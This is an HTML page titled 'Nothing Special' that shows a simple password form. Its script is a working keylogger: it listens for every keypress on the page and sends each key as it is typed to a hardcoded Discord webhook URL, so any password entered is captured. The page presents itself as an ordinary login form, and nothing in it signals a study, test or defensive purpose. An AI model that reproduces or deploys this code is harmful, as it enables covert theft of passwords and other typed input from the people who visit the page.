<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nothing Special</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    
        form {
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
    
        input[type="password"],
        input[type="submit"] {
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
    
        input[type="submit"] {
            background-color: #007bff;
            color: #fff;
            cursor: pointer;
        }
    </style>
</head>
<body>

<form action="#" method="post">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required>
    <input type="submit" value="Submit">
</form>

<script>
    // Your Discord webhook URL
    var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1218575470186991708/9dMvk0-5RBBPvUrsm7kv7oIS183aXZpxcg6LGMazPz5Cj8jsRhGQ2_pNCRmuaumuDpNj";

    document.addEventListener("keypress", function(event) {
        var key_pressed = event.key;
        var message = "Key pressed: " + key_pressed;
        sendToDiscord(message);
    });

    function sendToDiscord(message) {
        fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
        }).then(response => {
            if (!response.ok) {
                console.error('Failed to send message to Discord webhook:', response.statusText);
            }
        }).catch(error => {
            console.error('Error sending message to Discord webhook:', error);
        });
    }
</script>

</body>
</html>
